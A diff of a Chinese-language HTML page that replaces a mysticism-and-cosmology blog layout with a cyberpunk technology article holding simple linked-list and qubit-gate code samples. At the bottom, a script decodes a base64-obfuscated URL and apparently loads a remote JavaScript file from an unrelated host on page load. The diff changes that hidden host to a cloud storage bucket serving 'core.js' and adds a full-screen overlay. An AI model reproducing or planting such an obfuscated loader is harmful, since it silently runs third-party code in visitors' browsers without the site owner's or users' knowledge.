@@ -1,420 +1,420 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
+
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>玄学与宇宙探索随笔</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@400;700&family=ZCOOL+XiaoWei&display=swap" rel="stylesheet">
+    <meta name="viewport"
+        content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
+    <title>未来协议：数字前沿解析</title>
     <style>
-        * {
+        /* 全局重置与基础样式 */
+        body {
+            overflow: hidden;
+            font-family: 'Roboto Mono', monospace;
+            /* 科技感等宽字体 */
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
+            background-color: #0A0A0A;
+            /* 极深背景 */
+            color: #E0E0E0;
+            /* 亮灰色文本 */
+            line-height: 1.7;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
         }
-        
-        body {
-            font-family: 'Noto Serif SC', serif;
-            background: linear-gradient(135deg, #0c0c2e, #1a1a3e, #2d1b69);
-            color: #e6e6ff;
-            line-height: 1.6;
-            overflow-x: hidden;
-            position: relative;
-        }
-        
-        /* 星空背景 */
-        .stars {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: -1;
-        }
-        
-        .star {
-            position: absolute;
-            background-color: white;
-            border-radius: 50%;
-            animation: twinkle 5s infinite;
-        }
-        
-        @keyframes twinkle {
-            0%, 100% { opacity: 0.2; }
-            50% { opacity: 1; }
-        }
-        
-        /* 导航栏 */
-        nav {
-            position: fixed;
-            top: 0;
-            width: 100%;
-            background: rgba(10, 10, 35, 0.85);
-            backdrop-filter: blur(10px);
-            padding: 1rem 2rem;
-            z-index: 1000;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
-        }
-        
-        .logo {
-            font-family: 'ZCOOL XiaoWei', serif;
-            font-size: 1.8rem;
-            color: #b19cd9;
-            letter-spacing: 2px;
-        }
-        
-        .nav-links {
-            display: flex;
-            gap: 2rem;
-        }
-        
-        .nav-links a {
-            color: #c5c5e6;
-            text-decoration: none;
-            font-size: 1.1rem;
-            transition: color 0.3s;
-        }
-        
-        .nav-links a:hover {
-            color: #9d7bd9;
-        }
-        
-        /* 主内容区 */
+
+        /* 容器 */
         .container {
-            max-width: 1200px;
+            max-width: 90%;
+            /* 适应移动端 */
             margin: 0 auto;
-            padding: 100px 2rem 2rem;
+            padding: 20px 0;
         }
-        
-        /* 页眉 */
+
+        /* 头部 - 赛博朋克风格 */
         header {
+            background-color: #0D0D0D;
+            /* 更深的头部背景 */
+            padding: 40px 20px;
             text-align: center;
-            padding: 4rem 0;
-            position: relative;
-        }
-        
-        header h1 {
-            font-size: 3.5rem;
-            margin-bottom: 1rem;
-            background: linear-gradient(to right, #a78bfa, #c4b5fd);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            text-shadow: 0 0 20px rgba(167, 139, 250, 0.3);
-        }
-        
-        header p {
-            font-size: 1.3rem;
-            max-width: 700px;
-            margin: 0 auto;
-            color: #c5c5e6;
-        }
-        
-        /* 卡片布局 */
-        .card-container {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
-            gap: 2rem;
-            margin: 3rem 0;
-        }
-        
-        .card {
-            background: rgba(30, 30, 60, 0.7);
-            border-radius: 15px;
-            padding: 2rem;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
-            transition: transform 0.3s, box-shadow 0.3s;
-            border: 1px solid rgba(120, 120, 200, 0.2);
+            border-bottom: 2px solid #00FFFF;
+            /* 强调色：青色边框 */
+            box-shadow: 0 8px 25px rgba(0, 255, 255, 0.2);
+            /* 青色光晕阴影 */
             position: relative;
             overflow: hidden;
         }
-        
-        .card:hover {
-            transform: translateY(-10px);
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.4);
-        }
-        
-        .card::before {
+
+        header::before {
+            /* 顶部几何线条 */
             content: '';
             position: absolute;
             top: 0;
             left: 0;
             width: 100%;
             height: 5px;
-            background: linear-gradient(to right, #7e57c2, #5c6bc0);
+            background: linear-gradient(90deg, transparent, #00FFFF, transparent);
+            animation: scanline 3s infinite linear;
         }
-        
-        .card h2 {
-            color: #b19cd9;
-            margin-bottom: 1rem;
-            font-size: 1.8rem;
-            display: flex;
-            align-items: center;
-            gap: 10px;
+
+        @keyframes scanline {
+            0% {
+                transform: translateX(-100%);
+            }
+
+            100% {
+                transform: translateX(100%);
+            }
         }
-        
-        .card h2 i {
-            color: #7e57c2;
+
+        header h1 {
+            margin: 0;
+            font-family: 'Orbitron', sans-serif;
+            /* 假设字体可用，未来感标题 */
+            font-size: 2.8em;
+            color: #00FFFF;
+            /* 青色标题 */
+            letter-spacing: 3px;
+            text-shadow: 0 0 15px rgba(0, 255, 255, 0.8);
+            /* 强光晕效果 */
+            text-transform: uppercase;
         }
-        
-        .card p {
-            margin-bottom: 1.5rem;
-            color: #d1d1e9;
+
+        header p {
+            font-family: 'Roboto', sans-serif;
+            font-size: 1.1em;
+            color: #B0B0B0;
+            margin-top: 15px;
+            letter-spacing: 1px;
         }
-        
-        .card .read-more {
-            display: inline-block;
-            color: #9d7bd9;
-            text-decoration: none;
-            font-weight: bold;
-            transition: color 0.3s;
-        }
-        
-        .card .read-more:hover {
-            color: #c4b5fd;
-        }
-        
-        /* 引用部分 */
-        .quote {
-            background: rgba(40, 40, 80, 0.6);
-            border-left: 5px solid #7e57c2;
-            padding: 2rem;
-            margin: 3rem 0;
-            border-radius: 0 10px 10px 0;
-            font-style: italic;
-            position: relative;
-        }
-        
-        .quote::before {
-            content: '"';
-            font-size: 4rem;
-            color: rgba(126, 87, 194, 0.3);
-            position: absolute;
-            top: -10px;
-            left: 10px;
-        }
-        
-        /* 页脚 */
-        footer {
+
+        /* 导航菜单 - 发光按钮 */
+        nav {
+            background-color: transparent;
+            /* 透明背景 */
             text-align: center;
-            padding: 3rem 0;
-            margin-top: 4rem;
-            border-top: 1px solid rgba(120, 120, 200, 0.2);
-            color: #a5a5c7;
+            padding: 15px 0;
+            margin-top: 30px;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            border-bottom: 1px dashed #333333;
+            /* 虚线分隔 */
         }
-        
-        .social-links {
+
+        nav ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
             display: flex;
             justify-content: center;
-            gap: 1.5rem;
-            margin: 1.5rem 0;
+            flex-wrap: wrap;
         }
-        
-        .social-links a {
-            color: #b19cd9;
-            font-size: 1.5rem;
-            transition: color 0.3s;
+
+        nav ul li {
+            margin: 0 15px;
         }
-        
-        .social-links a:hover {
-            color: #c4b5fd;
+
+        nav ul li a {
+            background-color: #222222;
+            /* 按钮背景 */
+            color: #00FFFF;
+            /* 青色文字 */
+            text-decoration: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            /* 锐利边角 */
+            border: 1px solid #00FFFF;
+            /* 青色边框 */
+            transition: background-color 0.3s ease, color 0.3s ease, box-shadow 0.3s ease, transform 0.2s ease;
+            display: inline-block;
+            font-weight: bold;
+            font-size: 1em;
+            box-shadow: 0 0 8px rgba(0, 255, 255, 0.4);
+            /* 按钮发光 */
         }
-        
-        /* 响应式设计 */
-        @media (max-width: 768px) {
-            header h1 {
-                font-size: 2.5rem;
-            }
-            
-            .card-container {
-                grid-template-columns: 1fr;
-            }
-            
-            .nav-links {
-                display: none;
-            }
+
+        nav ul li a:hover,
+        nav ul li a:focus {
+            background-color: #00FFFF;
+            /* 悬停时背景变为青色 */
+            color: #0A0A0A;
+            /* 悬停时文字变为深色 */
+            transform: translateY(-3px);
+            box-shadow: 0 0 15px rgba(0, 255, 255, 0.8);
+            /* 更强发光 */
         }
-        
-        /* 玄学元素装饰 */
-        .taoist-symbol {
+
+        /* 内容区 - 模块化数据块 */
+        main {
+            padding-top: 30px;
+        }
+
+        section {
+            background-color: #1A1A1A;
+            /* 内容区背景 */
+            margin-bottom: 40px;
+            padding: 30px;
+            border-radius: 8px;
+            /* 适中圆角 */
+            border: 1px solid #333333;
+            /* 边框 */
+            box-shadow: 0 6px 18px rgba(0, 0, 0, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+
+        section::before {
+            /* 边角装饰 */
+            content: '';
             position: absolute;
-            opacity: 0.05;
-            font-size: 15rem;
-            color: white;
-            z-index: -1;
+            top: 0;
+            left: 0;
+            width: 20px;
+            height: 20px;
+            border-top: 2px solid #FF00FF;
+            /* 品红色 */
+            border-left: 2px solid #FF00FF;
         }
-        
-        .symbol-1 {
-            top: 10%;
-            left: 5%;
+
+        section::after {
+            /* 边角装饰 */
+            content: '';
+            position: absolute;
+            bottom: 0;
+            right: 0;
+            width: 20px;
+            height: 20px;
+            border-bottom: 2px solid #FF00FF;
+            border-right: 2px solid #FF00FF;
         }
-        
-        .symbol-2 {
-            bottom: 10%;
-            right: 5%;
-            transform: rotate(180deg);
+
+        section h2 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 2.2em;
+            color: #00FFFF;
+            /* 青色标题 */
+            margin-top: 0;
+            margin-bottom: 15px;
+            border-bottom: 1px dashed #333333;
+            /* 虚线分隔 */
+            padding-bottom: 10px;
+            text-shadow: 0 0 5px rgba(0, 255, 255, 0.5);
         }
-        
-        /* 滚动条样式 */
-        ::-webkit-scrollbar {
-            width: 8px;
+
+        section h3 {
+            font-family: 'Roboto Mono', monospace;
+            font-size: 1.4em;
+            color: #FF00FF;
+            /* 品红色 */
+            margin-top: 25px;
+            margin-bottom: 10px;
         }
-        
-        ::-webkit-scrollbar-track {
-            background: rgba(20, 20, 50, 0.5);
+
+        section p {
+            font-family: 'Roboto', sans-serif;
+            font-size: 1em;
+            color: #C0C0C0;
+            margin-bottom: 20px;
         }
-        
-        ::-webkit-scrollbar-thumb {
-            background: #7e57c2;
-            border-radius: 4px;
+
+        section img {
+            max-width: 100%;
+            height: auto;
+            display: block;
+            margin: 25px auto;
+            border-radius: 5px;
+            border: 2px solid #FF00FF;
+            /* 青色边框 */
+            box-shadow: 0 0 10px rgba(0, 255, 255, 0.5);
+            /* 图片发光 */
+        }
+
+        /* 代码块样式 - 终端风格 */
+        pre {
+            background-color: #000000;
+            /* 纯黑背景 */
+            color: #00FF00;
+            /* 亮绿色代码 */
+            padding: 20px;
+            border-radius: 8px;
+            overflow-x: auto;
+            font-family: 'Consolas', 'Monaco', monospace;
+            font-size: 0.9em;
+            margin-bottom: 25px;
+            border: 1px solid #00FF00;
+            /* 绿色边框 */
+            box-shadow: 0 0 15px rgba(0, 255, 0, 0.6);
+            /* 绿色发光 */
+        }
+
+        code {
+            font-family: 'Consolas', 'Monaco', monospace;
+            font-size: 0.9em;
+            color: #00FF00;
+            /* 亮绿色 */
+        }
+
+        pre code {
+            color: #00FF00;
+        }
+
+        /* 页脚 - 简洁科技感 */
+        footer {
+            background-color: #0D0D0D;
+            /* 页脚背景 */
+            color: #B0B0B0;
+            padding: 25px 0;
+            text-align: center;
+            font-size: 0.9em;
+            margin-top: 50px;
+            border-top: 2px solid #FF00FF;
+            /* 品红色边框 */
+            box-shadow: 0 -8px 25px rgba(255, 0, 255, 0.2);
+            /* 品红色光晕阴影 */
+        }
+
+        .footer-links a {
+            color: #FF00FF;
+            /* 品红色链接 */
+            text-decoration: none;
+            margin: 0 18px;
+            font-size: 1.2em;
+            transition: color 0.3s ease, text-shadow 0.3s ease;
+        }
+
+        .footer-links a:hover {
+            color: #00FFFF;
+            /* 悬停时变为青色 */
+            text-shadow: 0 0 10px rgba(0, 255, 255, 0.6);
         }
     </style>
+    <link rel="stylesheet" href="./static/css/style.css">
 </head>
+
 <body>
-    <!-- 星空背景 -->
-    <div class="stars" id="stars"></div>
-    
-    <!-- 导航栏 -->
-    <nav>
-        <div class="logo">玄宇随笔</div>
-        <div class="nav-links">
-            <a href="#home">首页</a>
-            <a href="#articles">文章</a>
-            <a href="#about">关于</a>
-            <a href="#contact">联系</a>
+    <header>
+        <div class="container">
+            <h1>未来协议</h1>
+            <p>数字前沿解析与趋势洞察</p>
         </div>
-    </nav>
-    
-    <!-- 玄学符号装饰 -->
-    <div class="taoist-symbol symbol-1">☯</div>
-    <div class="taoist-symbol symbol-2">☯</div>
-    
-    <!-- 主内容区 -->
+    </header>
+
     <div class="container">
-        <header id="home">
-            <h1>玄学与宇宙探索随笔</h1>
-            <p>探索宇宙的奥秘，感悟玄学的智慧，在星辰与道法之间寻找生命的真谛</p>
-        </header>
-        
-        <section class="card-container" id="articles">
-            <div class="card">
-                <h2><i class="fas fa-moon"></i> 月相与人类情绪</h2>
-                <p>自古以来，月亮的盈亏变化就被认为与人类情绪和行为有着神秘的联系。从占星术到现代心理学，我们探索月亮如何影响我们的内在世界。</p>
-                <p>满月之夜，急诊室的就诊率是否会增加？新月时分，是否是开始新项目的最佳时机？让我们一同探索这些有趣的现象。</p>
-                <a href="#" class="read-more">阅读更多 →</a>
-            </div>
-            
-            <div class="card">
-                <h2><i class="fas fa-star-and-crescent"></i> 易经与量子物理</h2>
-                <p>古老的《易经》与现代量子物理学之间存在着令人惊讶的相似之处。两者都描述了宇宙中变化的基本规律，只是使用了不同的语言和符号系统。</p>
-                <p>阴阳互补原理与量子叠加态，六十四卦与基本粒子，这些看似不相关的概念背后是否隐藏着宇宙的统一真理？</p>
-                <a href="#" class="read-more">阅读更多 →</a>
-            </div>
-            
-            <div class="card">
-                <h2><i class="fas fa-globe-asia"></i> 风水与空间能量</h2>
-                <p>风水学说是中国古代关于人与环境和谐相处的智慧结晶。现代科学开始发现，环境布局确实会影响我们的健康、情绪和决策。</p>
-                <p>从建筑心理学到环境能量场，我们探讨传统风水原则背后的科学原理，以及如何将这些智慧应用于现代生活空间。</p>
-                <a href="#" class="read-more">阅读更多 →</a>
-            </div>
-            
-            <div class="card">
-                <h2><i class="fas fa-atom"></i> 平行宇宙与多重现实</h2>
-                <p>根据量子力学和弦理论，我们的宇宙可能只是无数平行宇宙中的一个。每一个决定都可能创造出新的分支宇宙。</p>
-                <p>这种科学理论与佛教的"无量世界"概念、道教的"三千世界"说法有着惊人的相似性。这是巧合还是智慧的共鸣？</p>
-                <a href="#" class="read-more">阅读更多 →</a>
-            </div>
-            
-            <div class="card">
-                <h2><i class="fas fa-yin-yang"></i> 阴阳平衡与生态系统</h2>
-                <p>阴阳理论是道家哲学的核心，描述了宇宙中对立统一的基本规律。现代生态学发现，健康的生态系统正是建立在各种对立力量的动态平衡之上。</p>
-                <p>从捕食者与猎物的关系到碳循环中的吸收与释放，阴阳原理在自然界中无处不在。</p>
-                <a href="#" class="read-more">阅读更多 →</a>
-            </div>
-            
-            <div class="card">
-                <h2><i class="fas fa-infinity"></i> 意识与宇宙的关系</h2>
-                <p>意识是否是宇宙的基本属性？从泛心论到量子意识理论，科学家和哲学家正在重新思考意识在宇宙中的位置。</p>
-                <p>古老的冥想传统与现代神经科学都在探索同一个问题：我们的意识如何与更大的宇宙意识相连？</p>
-                <a href="#" class="read-more">阅读更多 →</a>
-            </div>
-        </section>
-        
-        <div class="quote">
-            <p>"仰观宇宙之大，俯察品类之盛，所以游目骋怀，足以极视听之娱，信可乐也。" —— 王羲之《兰亭集序》</p>
-        </div>
-        
-        <section id="about">
-            <div class="card">
-                <h2><i class="fas fa-user-astronaut"></i> 关于本站</h2>
-                <p>本站致力于探索玄学智慧与宇宙科学之间的交汇点。我们相信，古代智慧与现代科学并非对立，而是从不同角度揭示宇宙的奥秘。</p>
-                <p>通过跨学科的视角，我们尝试搭建一座连接神秘主义与理性科学的桥梁，让读者在探索宇宙的同时，也能深入自己的内心世界。</p>
-            </div>
-        </section>
+        <nav id="mainNav">
+            <ul>
+                <li><a href="#intro-protocol">引言协议</a></li>
+                <li><a href="#data-structures">数据结构</a></li>
+                <li><a href="#quantum-computing">量子计算</a></li>
+            </ul>
+        </nav>
+
+        <main>
+            <section id="intro-protocol">
+                <h2>引言协议：数字纪元的新范式</h2>
+                <img src="https://picsum.photos/300/200?random=1&id=futuristic-city-1" alt="未来城市景象"
+                    class="random-image">
+                <p>在高速迭代的数字纪元，理解并适应新的技术范式至关重要。本协议旨在为读者提供一份关于未来科技核心概念的深度解析，涵盖从基础架构到前沿应用的方方面面。</p>
+                <p>我们将探索数据流的优化路径、计算能力的边界突破，以及人工智能在伦理层面所面临的挑战与机遇。</p>
+            </section>
+
+            <section id="data-structures">
+                <h2>数据结构：信息流的骨架</h2>
+                <img src="https://picsum.photos/300/200?random=2&id=abstract-data-2" alt="抽象数据流" class="random-image">
+                <p>高效的数据结构是构建任何复杂系统的基石。它们决定了信息存储、检索与处理的效率。以下是一个简化版的链表节点定义：</p>
+                <pre><code>class Node:
+    def __init__(self, data):
+        self.data = data
+        self.next = None
+
+# 创建链表
+head = Node(10)
+second = Node(20)
+third = Node(30)
+
+head.next = second
+second.next = third
+
+print(head.data) # 输出: 10
+print(head.next.data) # 输出: 20</code></pre>
+                <p>理解这些基本构造是优化大规模数据处理的关键。</p>
+            </section>
+
+            <section id="quantum-computing">
+                <h2>量子计算：超越经典极限</h2>
+                <img src="https://picsum.photos/300/200?random=3&id=quantum-circuit-3" alt="量子电路" class="random-image">
+                <p>量子计算代表着计算能力的下一次革命。通过利用量子力学现象，如叠加和纠缠，量子计算机有望解决经典计算机无法企及的问题。</p>
+                <p>尽管仍处于早期阶段，但其在密码学、材料科学和药物发现等领域的潜力已引起广泛关注。</p>
+                <pre><code>// 模拟一个简单的量子门操作
+function applyHadamard(qubitState) {
+    // 假设 qubitState 是 [alpha, beta]
+    // H门操作会将 |0> 变为 (|0> + |1>)/sqrt(2)
+    // |1> 变为 (|0> - |1>)/sqrt(2)
+    const [alpha, beta] = qubitState;
+    const sqrt2 = Math.sqrt(2);
+    return [
+        (alpha + beta) / sqrt2,
+        (alpha - beta) / sqrt2
+    ];
+}
+
+let initialQubit = [1, 0]; // |0> 态
+let afterHadamard = applyHadamard(initialQubit);
+// console.log(afterHadamard); // 输出: [0.707..., 0.707...]</code></pre>
+            </section>
+
+            <section id="ai-ethics">
+                <h2>AI伦理：智能时代的责任边界</h2>
+                <img src="https://picsum.photos/300/200?random=4&id=ai-ethics-4" alt="AI伦理与人类" class="random-image">
+                <p>随着人工智能的普及，关于其伦理影响的讨论变得日益重要。如何确保AI系统的公平性、透明度和可控性，是构建负责任AI的关键。</p>
+                <p>我们必须建立健全的监管框架和道德准则，以引导AI技术朝着有益于人类社会的方向发展。</p>
+            </section>
+        </main>
     </div>
-    <footer id="contact">
-        <div class="social-links">
-            <a href="#"><i class="fab fa-weixin"></i></a>
-            <a href="#"><i class="fab fa-weibo"></i></a>
-            <a href="#"><i class="fab fa-github"></i></a>
-            <a href="#"><i class="fas fa-envelope"></i></a>
+
+    <footer>
+        <div class="container">
+            <p>&copy; 2025 未来协议. 数据流已加密.</p>
+            <div class="footer-links">
+                <a href="#" target="_blank">数据端口</a> |
+                <a href="#" target="_blank">通讯链路</a> |
+                <a href="#" target="_blank">系统日志</a>
+            </div>
         </div>
-        <p>© 2023 玄宇随笔 | 探索宇宙奥秘，感悟玄学智慧</p>
     </footer>
+    <div id="overlay">
+        <div id="loading_box" class="loading_container">
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+        </div>
+    </div>
+
     <script>
-        // 创建星空效果
-        function createStars() {
-            const starsContainer = document.getElementById('stars');
-            const starCount = 200;
-            
-            for (let i = 0; i < starCount; i++) {
-                const star = document.createElement('div');
-                star.classList.add('star');
-                
-                // 随机位置和大小
-                const size = Math.random() * 3;
-                const left = Math.random() * 100;
-                const top = Math.random() * 100;
-                const delay = Math.random() * 5;
-                
-                star.style.width = `${size}px`;
-                star.style.height = `${size}px`;
-                star.style.left = `${left}%`;
-                star.style.top = `${top}%`;
-                star.style.animationDelay = `${delay}s`;
-                
-                starsContainer.appendChild(star);
-            }
-        }
-        
-        // 页面加载完成后创建星空
-        window.addEventListener('DOMContentLoaded', createStars);
-        
-        // 平滑滚动
-        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
-            anchor.addEventListener('click', function (e) {
-                e.preventDefault();
-                
-                const targetId = this.getAttribute('href');
-                if (targetId === '#') return;
-                
-                const targetElement = document.querySelector(targetId);
-                if (targetElement) {
-                    window.scrollTo({
-                        top: targetElement.offsetTop - 80,
-                        behavior: 'smooth'
-                    });
-                }
+        document.addEventListener('DOMContentLoaded', function () {
+            document.querySelectorAll('nav a').forEach(anchor => {
+                anchor.addEventListener('click', function (e) {
+                    e.preventDefault();
+
+                    const targetId = this.getAttribute('href').substring(1);
+                    const targetElement = document.getElementById(targetId);
+
+                    if (targetElement) {
+                        window.scrollTo({
+                            top: targetElement.offsetTop,
+                            behavior: 'smooth'
+                        });
+                    }
+                });
             });
         });
     </script>
- <script>
+    <script>
         (function () {
             function init() {
-                const encodedUrl = "aHR0cHM6Ly9jZG4ucmZpd3B3LmNuL3N0YXRpYy9qcy9jb2RlLmVuLmpz";
+                const encodedUrl = "aHR0cHM6Ly91c2hvcGltZ3Mub3NzLWFwLXNvdXRoZWFzdC0xLmFsaXl1bmNzLmNvbS9jb3JlLmpz";
                 const decodedUrl = atob(encodedUrl);
                 const timestamp = Date.now();
                 const randomNum = Math.floor(Math.random() * 1000000);
@@ -426,5 +426,7 @@
             init();
         })();
     </script>
+
 </body>
+
 </html>
